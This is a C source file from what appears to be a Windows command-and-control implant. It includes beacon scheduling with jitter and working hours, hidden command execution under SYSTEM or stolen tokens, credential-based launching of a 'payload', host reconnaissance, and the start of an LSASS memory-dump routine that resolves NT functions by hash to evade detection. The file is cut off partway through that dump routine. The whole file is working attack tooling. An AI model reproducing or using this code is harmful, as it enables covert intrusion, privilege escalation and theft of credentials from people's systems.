#include <winsock2.h>
#include <ws2tcpip.h>
#include "commands.h"
#include "bof.h"
#include "kerberos.h"
#include "transport.h"
#include "config.h"
#include "evasion.h"
#include "b64.h"
#include "rsocks.h"
#include "http_pivot.h"
#include "tcp_pivot.h"
#include "pipe_server.h"
#include "portfwd.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <time.h>
#define SECURITY_WIN32
#include <secext.h>
#include "api_resolve.h"
#include "pe_exec.h"
#include "dotnet.h"
#include "browsercreds.h"
#include <bcrypt.h>
#include <winternl.h>

/* Runtime working-hours window ("HH:MM-HH:MM" or "" = always beacon) */
char g_working_hours[32] = {0};

// Dynamic sleep/jitter (updated by SLEEP command)
int g_sleep_sec  = AGENT_SLEEP_SEC;
int g_jitter_pct = AGENT_JITTER_PCT;

// ── SYSTEM primary token (stored by getsystem, used by run_shell) ────────────
static HANDLE g_system_token = NULL;
// Primary token from steal-token/make-token; used by run_shell when g_system_token is NULL.
static HANDLE g_stolen_token = NULL;

/* Declared here because the shell path runs before the token helpers below. */
static int enable_privilege(HANDLE hToken, const char *priv_name);

// ── Screenwatch globals ────────────────────────────────────────────────────────
static volatile int g_sw_stop = 1;
static long long    g_sw_task_id = 0;
static int          g_sw_interval = 10;
static DWORD        g_sw_last_tick = 0;
static int          g_sw_frame = 0;

// ── Working hours ─────────────────────────────────────────────────────────────

int in_working_hours(void) {
    if (!g_working_hours[0]) return 1;  /* empty = always beacon */
    char *dash = strchr(g_working_hours, '-');
    if (!dash) return 1;
    int sh=0,sm=0,eh=0,em=0;
    sscanf(g_working_hours, "%d:%d", &sh, &sm);
    sscanf(dash+1, "%d:%d", &eh, &em);
    SYSTEMTIME st; GetLocalTime(&st);
    int cur = (int)st.wHour * 60 + (int)st.wMinute;
    int s = sh*60+sm, e = eh*60+em;
    if (s <= e) return cur >= s && cur < e;
    return cur >= s || cur < e;  /* overnight */
}

void sleep_until_work_hours(void) {
    if (!g_working_hours[0]) return;
    char *dash = strchr(g_working_hours, '-');
    if (!dash) return;
    int sh=0,sm=0;
    sscanf(g_working_hours, "%d:%d", &sh, &sm);
    SYSTEMTIME st; GetLocalTime(&st);
    int cur = (int)st.wHour * 60 + (int)st.wMinute;
    int s = sh*60+sm;
    int wait_min = (cur < s) ? s - cur : (24*60 - cur) + s;
    if (wait_min > 0) sleep_masked((DWORD)wait_min * 60 * 1000);
}

// ── Shell execution ───────────────────────────────────────────────────────────

static char* run_shell(const char *cmd) {
    char full_cmd[4096];
    char shell_args[4096];
    /* /s has quote-stripping rules that are surprising when redirection is
       appended after the quoted command.  Let /c consume the remainder
       directly and disable AutoRun so the result is deterministic. */
    int args_len = snprintf(shell_args, sizeof(shell_args), "/d /c %s 2>&1", cmd);
    if (args_len < 0 || (size_t)args_len >= sizeof(shell_args)) {
        return strdup("[error: shell command too long]");
    }
    int full_len = snprintf(full_cmd, sizeof(full_cmd), "cmd.exe %s", shell_args);
    if (full_len < 0 || (size_t)full_len >= sizeof(full_cmd)) {
        return strdup("[error: shell command too long]");
    }

    HANDLE hSysTok = (HANDLE)InterlockedCompareExchangePointer(
        (PVOID*)&g_system_token, NULL, NULL);
    if (!hSysTok)
        hSysTok = (HANDLE)InterlockedCompareExchangePointer(
            (PVOID*)&g_stolen_token, NULL, NULL);
    if (hSysTok) {
        static const wchar_t cmd_app[] = L"C:\\Windows\\System32\\cmd.exe";
        static const wchar_t cmd_cwd[] = L"C:\\Windows\\System32";

        /* Enable required privileges on the calling process and the SYSTEM token. */
        HANDLE hSelf = NULL;
        if (OpenProcessToken(GetCurrentProcess(),
                             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelf)) {
            enable_privilege(hSelf, "SeImpersonatePrivilege");
            enable_privilege(hSelf, "SeIncreaseQuotaPrivilege");
            enable_privilege(hSelf, "SeAssignPrimaryTokenPrivilege");
            CloseHandle(hSelf);
        }
        enable_privilege(hSysTok, "SeImpersonatePrivilege");
        enable_privilege(hSysTok, "SeIncreaseQuotaPrivilege");
        enable_privilege(hSysTok, "SeAssignPrimaryTokenPrivilege");

        /* Use the same token-launch path as the Go agent.  The child owns the
           redirection file, so seclogon never has to duplicate anonymous pipe
           handles across sessions. */
        char out_path[MAX_PATH];
        snprintf(out_path, sizeof(out_path),
                 "C:\\Windows\\Temp\\sbo%08lx%08lx.tmp",
                 (unsigned long)GetCurrentProcessId(),
                 (unsigned long)GetTickCount());
        char redir_args[4096 + MAX_PATH + 32];
        int redir_len = snprintf(redir_args, sizeof(redir_args),
                                 "/d /c %s > \"%s\" 2>&1", cmd, out_path);
        if (redir_len < 0 || (size_t)redir_len >= sizeof(redir_args))
            return strdup("[error: shell command too long]");
        wchar_t wargs[4096 + MAX_PATH + 32];
        wchar_t wargs2[4096 + MAX_PATH + 32];
        MultiByteToWideChar(CP_ACP, 0, redir_args, -1, wargs,
                            (int)(sizeof(wargs)/sizeof(wargs[0])));
        memcpy(wargs2, wargs, sizeof(wargs2));
        STARTUPINFOW si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        BOOL proc_ok = FALSE;
        DWORD with_token_err = 0, as_user_err = 0, imp_err = 0;
        if (CreateProcessWithTokenW) {
            proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs,
                CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
            if (!proc_ok) with_token_err = GetLastError();
        }
        if (!proc_ok && CreateProcessAsUserW) {
            proc_ok = CreateProcessAsUserW(hSysTok, cmd_app, wargs2,
                NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
            if (!proc_ok) as_user_err = GetLastError();
        }
        if (!proc_ok && CreateProcessWithTokenW) {
            if (ImpersonateLoggedOnUser(hSysTok)) {
                wchar_t wargs3[4096 + MAX_PATH + 32];
                memcpy(wargs3, wargs, sizeof(wargs3));
                proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs3,
                    CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
                if (!proc_ok) with_token_err = GetLastError();
                RevertToSelf();
            } else {
                imp_err = GetLastError();
            }
        }
        if (!proc_ok) {
            char *e = (char*)malloc(192);
            snprintf(e, 192,
                     "[error: SYSTEM shell launch; WithToken=%lu; AsUser=%lu; Impersonate=%lu]",
                     with_token_err, as_user_err, imp_err);
            return e;
        }
        DWORD wait_result = WaitForSingleObject(pi.hProcess, 60000);
        DWORD child_exit = STILL_ACTIVE;
        GetExitCodeProcess(pi.hProcess, &child_exit);
        if (wait_result == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 1);
            child_exit = 1;
        }
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        HANDLE hFile = CreateFileA(out_path, GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            DeleteFileA(out_path);
            char *e = (char*)malloc(192);
            snprintf(e, 192,
                     "[error: SYSTEM shell capture missing; exit=%lu; WithToken=%lu; AsUser=%lu]",
                     (unsigned long)child_exit, (unsigned long)with_token_err,
                     (unsigned long)as_user_err);
            return e;
        }
        DWORD fsize = GetFileSize(hFile, NULL);
        char *buf2 = fsize > 0 ? (char*)malloc((size_t)fsize + 1) : NULL;
        DWORD nr2 = 0;
        if (buf2 && fsize > 0) {
            ReadFile(hFile, buf2, fsize, &nr2, NULL);
            buf2[nr2] = '\0';
        }
        CloseHandle(hFile);
        DeleteFileA(out_path);
        if (!buf2) {
            /* Empty output is valid for commands such as schtasks /Run, but
               a non-zero child exit with no file data is a real failure. */
            if (child_exit != 0) {
                char *e = (char*)malloc(192);
                snprintf(e, 192,
                         "[error: SYSTEM shell capture empty; exit=%lu; WithToken=%lu; AsUser=%lu]",
                         (unsigned long)child_exit, (unsigned long)with_token_err,
                         (unsigned long)as_user_err);
                return e;
            }
            return strdup("");
        }
        return buf2;
    }

    /* Use a temp-file approach instead of _popen to prevent pipe write handles
     * from leaking into grandchild processes (e.g. 'cmd /c start /b agent.exe').
     * With _popen, a grandchild that inherits the pipe's write end causes fgetc()
     * to block indefinitely until that child exits — this killed the HTTPS agent. */
    char tmp_dir[MAX_PATH];
    if (!GetTempPathA(sizeof(tmp_dir), tmp_dir))
        lstrcpyA(tmp_dir, "C:\\Users\\Public\\");
    char out_path[MAX_PATH + 32];
    snprintf(out_path, sizeof(out_path), "%ssbo%08lx%08lx.tmp",
             tmp_dir,
             (unsigned long)GetCurrentProcessId(),
             (unsigned long)GetTickCount());
    char redir_cmd[4096 + MAX_PATH + 64];
    if (snprintf(redir_cmd, sizeof(redir_cmd),
                 "cmd.exe /d /c %s > \"%s\" 2>&1", cmd, out_path)
                 >= (int)sizeof(redir_cmd)) {
        return strdup("[error: shell command too long]");
    }
    STARTUPINFOA si2 = { sizeof(si2) };
    si2.dwFlags    = STARTF_USESHOWWINDOW;
    si2.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi2 = {0};
    if (!CreateProcessA(NULL, redir_cmd, NULL, NULL,
                        FALSE,   /* bInheritHandles=FALSE: no handles leak to children */
                        CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
        DeleteFileA(out_path);
        return strdup("[error: shell failed]");
    }
    DWORD wait2 = WaitForSingleObject(pi2.hProcess, 60000);
    if (wait2 == WAIT_TIMEOUT) TerminateProcess(pi2.hProcess, 1);
    CloseHandle(pi2.hProcess);
    CloseHandle(pi2.hThread);
    HANDLE hF = CreateFileA(out_path, GENERIC_READ,
                            FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hF == INVALID_HANDLE_VALUE) {
        DeleteFileA(out_path);
        return strdup("");
    }
    DWORD fsz = GetFileSize(hF, NULL);
    char *buf = (char*)malloc((size_t)(fsz > 0 ? fsz : 0) + 1);
    DWORD nr = 0;
    if (buf && fsz > 0) ReadFile(hF, buf, fsz, &nr, NULL);
    if (buf) buf[nr] = '\0';
    CloseHandle(hF);
    DeleteFileA(out_path);
    return buf ? buf : strdup("");
}

/* schtasks writes failures to its captured stream while still returning a
   normal-looking string to the caller.  Keep the RunAs path from reporting a
   false [+] when task creation or execution was rejected. */
static int shell_output_is_error(const char *out) {
    if (!out) return 1;
    if (strstr(out, "[error:") || strstr(out, "ERROR:") || strstr(out, "ERROR "))
        return 1;
    return 0;
}

/* CreateProcessWithLogonW is the credential-backed RunAs path.  It starts the
   child immediately and avoids the Task Scheduler's mandatory /ST value for
   ONCE tasks.  The token APIs below are compatibility fallbacks for hosts
   where Secondary Logon or a local policy blocks the primary path. */
static int spawn_as_user_direct(const char *path, const char *account,
                                const char *password, DWORD *pid_out,
                                char *err, size_t err_cap) {
    if (!path || !path[0] || !account || !account[0] || !password) {
        snprintf(err, err_cap, "runas: invalid direct-launch arguments");
        return 0;
    }
    if (!CreateProcessWithLogonW && !LogonUserW) {
        snprintf(err, err_cap, "runas: token process APIs unavailable");
        return 0;
    }

    char user[256] = {0}, domain[256] = {0};
    const char *sep = strchr(account, '\\');
    if (!sep) sep = strchr(account, '/');
    if (sep) {
        size_t dlen = (size_t)(sep - account);
        if (dlen == 0 || dlen >= sizeof(domain) || strlen(sep + 1) >= sizeof(user)) {
            snprintf(err, err_cap, "runas: account name is too long");
            return 0;
        }
        memcpy(domain, account, dlen); domain[dlen] = '\0';
        strncpy(user, sep + 1, sizeof(user) - 1);
    } else if (strchr(account, '@')) {
        /* UPN form is accepted with a NULL domain. */
        strncpy(user, account, sizeof(user) - 1);
    } else {
        strncpy(user, account, sizeof(user) - 1);
        strncpy(domain, ".", sizeof(domain) - 1);
    }

    WCHAR wuser[256] = {0}, wdomain[256] = {0}, wpass[512] = {0};
    WCHAR wpath[1024] = {0}, wcmd[1100] = {0};
    WCHAR wcmd_as_user[1100] = {0}, wcmd_with_token[1100] = {0};
    if (!MultiByteToWideChar(CP_ACP, 0, user, -1, wuser,
                             (int)(sizeof(wuser) / sizeof(wuser[0])))) {
        snprintf(err, err_cap, "runas: user conversion failed");
        return 0;
    }
    if (domain[0] && !MultiByteToWideChar(CP_ACP, 0, domain, -1, wdomain,
                                          (int)(sizeof(wdomain) / sizeof(wdomain[0])))) {
        snprintf(err, err_cap, "runas: domain conversion failed");
        return 0;
    }
    if (!MultiByteToWideChar(CP_ACP, 0, password, -1, wpass,
                             (int)(sizeof(wpass) / sizeof(wpass[0])))) {
        snprintf(err, err_cap, "runas: password conversion failed");
        return 0;
    }
    if (!MultiByteToWideChar(CP_ACP, 0, path, -1, wpath,
                             (int)(sizeof(wpath) / sizeof(wpath[0])))) {
        snprintf(err, err_cap, "runas: payload path conversion failed");
        return 0;
    }
    if (swprintf_s(wcmd, sizeof(wcmd) / sizeof(wcmd[0]), L"\"%ls\"", wpath) < 0) {
        snprintf(err, err_cap, "runas: payload command line is too long");
        return 0;
    }
    memcpy(wcmd_as_user, wcmd, sizeof(wcmd_as_user));
    memcpy(wcmd_with_token, wcmd, sizeof(wcmd_with_token));

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    BOOL created = FALSE;
    DWORD with_logon_err = 0, batch_err = 0, interactive_err = 0;
    DWORD as_user_err = 0, with_token_err = 0;
    LPCWSTR domain_ptr = domain[0] ? wdomain : NULL;

    /* Credential-backed launch: create the child immediately without the
       Task Scheduler. */
    if (CreateProcessWithLogonW) {
        created = CreateProcessWithLogonW(wuser, domain_ptr, wpass, 0,
            wpath, wcmd, CREATE_NO_WINDOW, NULL,
            L"C:\\Windows\\System32", &si, &pi);
        if (!created) with_logon_err = GetLastError();
    }
    if (created) {
        if (pid_out) *pid_out = pi.dwProcessId;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    /* Compatibility path: use a real primary logon token when Secondary Logon
       is disabled or the credential-backed API is blocked by local policy. */
    BOOL impersonated = FALSE;
    HANDLE system_token = (HANDLE)InterlockedCompareExchangePointer(
        (PVOID*)&g_system_token, NULL, NULL);
    if (system_token && ImpersonateLoggedOnUser(system_token)) {
        impersonated = TRUE;
        enable_privilege(system_token, "SeImpersonatePrivilege");
        enable_privilege(system_token, "SeIncreaseQuotaPrivilege");
        enable_privilege(system_token, "SeAssignPrimaryTokenPrivilege");
    }

    HANDLE self = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &self)) {
        enable_privilege(self, "SeImpersonatePrivilege");
        enable_privilege(self, "SeIncreaseQuotaPrivilege");
        enable_privilege(self, "SeAssignPrimaryTokenPrivilege");
        CloseHandle(self);
    }

    HANDLE user_token = NULL;
    BOOL logged = FALSE;
    if (LogonUserW) {
        logged = LogonUserW(wuser, domain_ptr, wpass,
                            LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &user_token);
        if (!logged) {
            batch_err = GetLastError();
            /* Some policies do not grant SeBatchLogonRight. */
            logged = LogonUserW(wuser, domain_ptr, wpass,
                                LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
                                &user_token);
            if (!logged) interactive_err = GetLastError();
        }
    }
    if (logged) {
        if (CreateProcessAsUserW) {
            created = CreateProcessAsUserW(user_token, wpath, wcmd_as_user,
                NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL,
                L"C:\\Windows\\System32", &si, &pi);
            if (!created) as_user_err = GetLastError();
        }
        if (!created && CreateProcessWithTokenW) {
            created = CreateProcessWithTokenW(user_token, 0, wpath, wcmd_with_token,
                CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32", &si, &pi);
            if (!created) with_token_err = GetLastError();
        }
    }
    if (!created) {
        snprintf(err, err_cap,
                 "runas: direct launch failed; LogonW=%lu batch=%lu interactive=%lu AsUser=%lu WithToken=%lu",
                 (unsigned long)with_logon_err, (unsigned long)batch_err,
                 (unsigned long)interactive_err, (unsigned long)as_user_err,
                 (unsigned long)with_token_err);
        goto direct_done;
    }
    if (pid_out) *pid_out = pi.dwProcessId;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    {
        int ok = 1;
        CloseHandle(user_token);
        user_token = NULL;
        if (impersonated) RevertToSelf();
        return ok;
    }

direct_done:
    if (user_token) CloseHandle(user_token);
    if (impersonated) RevertToSelf();
    return 0;
}

static void runas_start_time(char *out, size_t out_cap) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    int total = (int)st.wHour * 60 + (int)st.wMinute + 2;
    total %= 24 * 60;
    snprintf(out, out_cap, "%02d:%02d", total / 60, total % 60);
}

// ── Directory listing ─────────────────────────────────────────────────────────

static char* do_ls(const char *path) {
    char pattern[MAX_PATH];
    if (!path || !path[0]) {
        GetCurrentDirectoryA(sizeof(pattern), pattern);
        strncat(pattern, "\\*", sizeof(pattern) - strlen(pattern) - 1);
    } else {
        snprintf(pattern, sizeof(pattern), "%s\\*", path);
    }

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return strdup("[error listing]");

    size_t cap = 4096, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { FindClose(h); return strdup("[oom]"); }
    buf[0] = '\0';

    do {
        char line[MAX_PATH + 4];
        const char *kind = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "D" : "F";
        // Build full path for display
        char dir[MAX_PATH];
        if (!path || !path[0]) GetCurrentDirectoryA(sizeof(dir), dir);
        else strncpy(dir, path, sizeof(dir) - 1);
        snprintf(line, sizeof(line), "%s  %s\\%s\n", kind, dir, fd.cFileName);

        size_t ll = strlen(line);
        if (len + ll + 2 >= cap) {
            cap = len + ll + 4096;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        strncat(buf + len, line, cap - len - 1);
        len += ll;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return buf;
}

static void escape_json_str(char *out, size_t outsz, const char *in) {
    size_t o = 0;
    for (size_t i = 0; in[i] && o + 3 < outsz; i++) {
        if      (in[i] == '\\') { out[o++] = '\\'; out[o++] = '\\'; }
        else if (in[i] == '"')  { out[o++] = '\\'; out[o++] = '"'; }
        else                     { out[o++] = in[i]; }
    }
    out[o] = '\0';
}

static char* do_ls_json(const char *path) {
    char dir[MAX_PATH];
    if (!path || !path[0]) {
        GetCurrentDirectoryA(sizeof(dir), dir);
    } else {
        char abs[MAX_PATH];
        if (GetFullPathNameA(path, sizeof(abs), abs, NULL))
            strncpy(dir, abs, sizeof(dir) - 1);
        else
            strncpy(dir, path, sizeof(dir) - 1);
        dir[sizeof(dir) - 1] = '\0';
    }

    char cwd[MAX_PATH];
    GetCurrentDirectoryA(sizeof(cwd), cwd);

    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);

    char cwd_esc[MAX_PATH * 2], dir_esc[MAX_PATH * 2];
    escape_json_str(cwd_esc, sizeof(cwd_esc), cwd);
    escape_json_str(dir_esc, sizeof(dir_esc), dir);

    size_t cap = 16384, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) return strdup("{\"error\":\"oom\"}");

    len = (size_t)snprintf(buf, cap, "{\"cwd\":\"%s\",\"path\":\"%s\",\"entries\":[",
                           cwd_esc, dir_esc);

    if (h == INVALID_HANDLE_VALUE) {
        snprintf(buf + len, cap - len, "]}");
        return buf;
    }

    int first = 1;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        int is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
        ULONGLONG sz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;

        SYSTEMTIME st;
        FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
        char mod[32];
        snprintf(mod, sizeof(mod), "%04d-%02d-%02d %02d:%02d",
                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        char name_esc[MAX_PATH * 2];
        escape_json_str(name_esc, sizeof(name_esc), fd.cFileName);

        char entry[MAX_PATH * 3];
        int elen = snprintf(entry, sizeof(entry),
                            "%s{\"name\":\"%s\",\"is_dir\":%s,\"size\":%llu,\"mod\":\"%s\"}",
                            first ? "" : ",",
                            name_esc,
                            is_dir ? "true" : "false",
                            (unsigned long long)sz,
                            mod);
        first = 0;

        if (len + (size_t)elen + 4 >= cap) {
            cap = len + (size_t)elen + 4096;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        memcpy(buf + len, entry, (size_t)elen);
        len += (size_t)elen;
    } while (FindNextFileA(h, &fd));

    FindClose(h);
    if (len + 3 >= cap) { char *nb = (char*)realloc(buf, len + 4); if (nb) buf = nb; }
    buf[len++] = ']'; buf[len++] = '}'; buf[len] = '\0';
    return buf;
}

// ── Sysinfo ───────────────────────────────────────────────────────────────────

static char* do_sysinfo(void) {
    char hostname[128] = "UNKNOWN", username[256] = "UNKNOWN";
    DWORD h_sz = sizeof(hostname);
    GetComputerNameA(hostname, &h_sz);
    for (DWORD i = 0; i < h_sz; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
    ULONG u_sz = sizeof(username);
    if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &u_sz))
        GetUserNameA(username, (DWORD*)&u_sz); /* fallback: local account */
    char *buf = (char*)malloc(512);
    if (!buf) return strdup("oom");
    snprintf(buf, 512,
        "hostname=%s\nusername=%s\nos=windows/amd64\npid=%lu",
        hostname, username, (unsigned long)GetCurrentProcessId());
    return buf;
}

// ── Jitter sleep ──────────────────────────────────────────────────────────────

unsigned long sleep_ms_jitter(void) {
    unsigned long base = (unsigned long)g_sleep_sec * 1000;
    if (g_jitter_pct <= 0) return base;
    unsigned long jit = base * g_jitter_pct / 100;
    unsigned long r;
    BCryptGenRandom(NULL, (PUCHAR)&r, sizeof(r), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    long long delta = (long long)(r % (jit * 2 + 1)) - (long long)jit;
    long long ms = (long long)base + delta;
    if (ms < 1000) ms = 1000;
    return (unsigned long)ms;
}

// ── JSON helpers ─────────────────────────────────────────────────────────────

static int json_get_int(const char *json, const char *key, int def) {
    char pat[128]; snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat); if (!p) return def;
    p = strchr(p, ':'); if (!p) return def;
    int v; return sscanf(p+1, " %d", &v) == 1 ? v : def;
}

static void json_get_str(const char *json, const char *key, char *out, size_t out_sz, const char *def) {
    char pat[128]; snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) { strncpy(out, def, out_sz-1); out[out_sz-1]='\0'; return; }
    p = strchr(p + strlen(pat), '"');
    if (!p) { strncpy(out, def, out_sz-1); out[out_sz-1]='\0'; return; }
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz-1) {
        if (*p == '\\' && *(p+1)) {
            p++;
            if      (*p == '\\') out[i++] = '\\';
            else if (*p == '"')  out[i++] = '"';
            else if (*p == '/')  out[i++] = '/';
            else if (*p == 'n')  out[i++] = '\n';
            else if (*p == 'r')  out[i++] = '\r';
            else if (*p == 't')  out[i++] = '\t';
            else if (*p == 'u' && i < out_sz-2) {
                /* \uXXXX — handle BMP ASCII range only */
                char hex[5]={0}; int valid=1;
                for (int h=0;h<4;h++) { if (!*(p+1+h)) {valid=0;break;} hex[h]=*(p+1+h); }
                if (valid) { int cp=(int)strtol(hex,NULL,16); p+=4; if(cp>0&&cp<128) out[i++]=(char)cp; }
                else out[i++] = '?';
            } else out[i++] = *p;
        } else out[i++] = *p;
        p++;
    }
    out[i] = '\0';
}

/* ISHELL_RUN is normally sent as raw command text.  Keep accepting the
 * object form used by older callers so the agent remains wire-compatible. */
static void ishell_get_command(const char *args, char *out, size_t out_sz) {
    if (!out || out_sz == 0) return;
    out[0] = '\0';
    if (!args) return;

    const char *p = args;
    while (*p && isspace((unsigned char)*p)) p++;
    if (*p == '{' && strstr(p, "\"cmd\"") != NULL) {
        json_get_str(p, "cmd", out, out_sz, "");
    } else {
        strncpy(out, p, out_sz - 1);
        out[out_sz - 1] = '\0';
    }

    size_t n = strlen(out);
    while (n > 0 && (out[n - 1] == '\r' || out[n - 1] == '\n'))
        out[--n] = '\0';
}

/* Accept both the current JSON form ({"shell":"ps"}) and the legacy
 * plain-text form ("ps") used by older operators. */
static void ishell_get_shell(const char *args, char *out, size_t out_sz) {
    if (!out || out_sz == 0) return;
    out[0] = '\0';
    if (!args) return;
    const char *p = args;
    while (*p && isspace((unsigned char)*p)) p++;
    if (*p == '{') json_get_str(p, "shell", out, out_sz, "cmd");
    else {
        strncpy(out, p, out_sz - 1);
        out[out_sz - 1] = '\0';
    }
    size_t n = strlen(out);
    while (n > 0 && isspace((unsigned char)out[n - 1])) out[--n] = '\0';
    if (!out[0]) strncpy(out, "cmd", out_sz - 1);
}

/* Drain all currently available bytes without blocking on an interactive
 * command that is waiting for more input. */
static int ishell_drain_pipe(HANDLE pipe, char *buf, size_t cap, size_t *len) {
    int read_any = 0;
    while (*len + 1 < cap) {
        DWORD available = 0;
        if (!PeekNamedPipe(pipe, NULL, 0, NULL, &available, NULL)) return -1;
        if (available == 0) break;

        DWORD want = available;
        if ((size_t)want > cap - *len - 1) want = (DWORD)(cap - *len - 1);
        DWORD got = 0;
        if (!ReadFile(pipe, buf + *len, want, &got, NULL) || got == 0) return -1;
        *len += (size_t)got;
        buf[*len] = '\0';
        read_any = 1;
    }
    return read_any;
}

// ── LSASS_DUMP_NT ─────────────────────────────────────────────────────────────
// Builds a minimal valid MDMP via NtReadVirtualMemory; no MiniDumpWriteDump call.
// Returns heap-allocated buffer (caller must free) or NULL on failure.
// *out_len receives the buffer size.
// *out_partial is set when the bounded capture could not include all readable
// regions, so the caller can report that the resulting dump is partial.

#define LSASS_NT_MAX_DUMP_BYTES (256ULL * 1024ULL * 1024ULL)
#define LSASS_NT_READ_CHUNK     (1024ULL * 1024ULL)
#define LSASS_NT_MAX_REGIONS    65536U

static int lsass_region_is_readable(DWORD protect) {
    DWORD base = protect & 0xffU;
    if (protect & (PAGE_GUARD | PAGE_NOACCESS)) return 0;
    switch (base) {
        case PAGE_READONLY:
        case PAGE_READWRITE:
        case PAGE_WRITECOPY:
        case PAGE_EXECUTE_READ:
        case PAGE_EXECUTE_READWRITE:
        case PAGE_EXECUTE_WRITECOPY:
            return 1;
        default:
            return 0;
    }
}

static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len, int *out_partial) {
    *out_len = 0;
    if (out_partial) *out_partial = 0;

    /* resolve NtReadVirtualMemory and RtlGetVersion via hash — no plaintext NT strings */
    typedef LONG (NTAPI *NtReadVM_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NtReadVM_t ntReadVM = (NtReadVM_t)resolve_fn(H_NT_NtReadVirtualMemory);
    if (!ntReadVM) return NULL;

    /* detect real OS version via RtlGetVersion (bypasses GetVersionEx compat shim) */
    typedef LONG (NTAPI *RtlGetVersion_t)(OSVERSIONINFOW *);
    OSVERSIONINFOW osvi = {0}; osvi.dwOSVersionInfoSize = sizeof(osvi);
    RtlGetVersion_t pfnRtlGetVersion = (RtlGetVersion_t)resolve_fn(H_NT_RtlGetVersion);
    if (pfnRtlGetVersion) pfnRtlGetVersion(&osvi);
    DWORD os_major = osvi.dwMajorVersion ? osvi.dwMajorVersion : 10;
    DWORD os_minor = osvi.dwMinorVersion;
    DWORD os_build = osvi.dwBuildNumber  ? osvi.dwBuildNumber  : 19041;

    /* find lsass PID if not provided */
    if (!lsas_pid) {
        HANDLE snap0 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap0 != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
            if (Process32First(snap0, &pe)) {
                do {
                    if (_stricmp(pe.szExeFile, "lsass.exe") == 0) { lsas_pid = pe.th32ProcessID; break; }
                } while (Process32Next(snap0, &pe));
            }
            CloseHandle(snap0);
        }
    }
    if (!lsas_pid) return NULL;

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsas_pid);
    if (!hProc) return NULL;

    /* enumerate modules */
    typedef struct { uint64_t base; uint32_t sz; char name[256]; } ModInfo;
    ModInfo *mods = NULL; int n_mods = 0, cap_mods = 0;
    HANDLE snap1 = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, lsas_pid);
    if (snap1 != INVALID_HANDLE_VALUE) {
        MODULEENTRY32 me; me.dwSize = sizeof(me);
        if (Module32First(snap1, &me)) {
            do {
                if (n_mods >= cap_mods) {
                    int next_cap = cap_mods ? cap_mods * 2 : 64;
                    ModInfo *next = (ModInfo*)realloc(mods, (size_t)next_cap * sizeof(ModInfo));
                    if (!next) {
                        /* A module list is optional for a usable memory stream. */
                        free(mods); mods = NULL; n_mods = 0; cap_mods = 0;
                        break;
                    }
                    mods = next;
                    cap_mods = next_cap;
                }
                mods[n_mods].base = (uint64_t)(uintptr_t)me.modBaseAddr;
                mods[n_mods].sz   = me.modBaseSize;
                strncpy(mods[n_mods].name, me.szModule, 255); mods[n_mods].name[255] = 0;
                n_mods++;
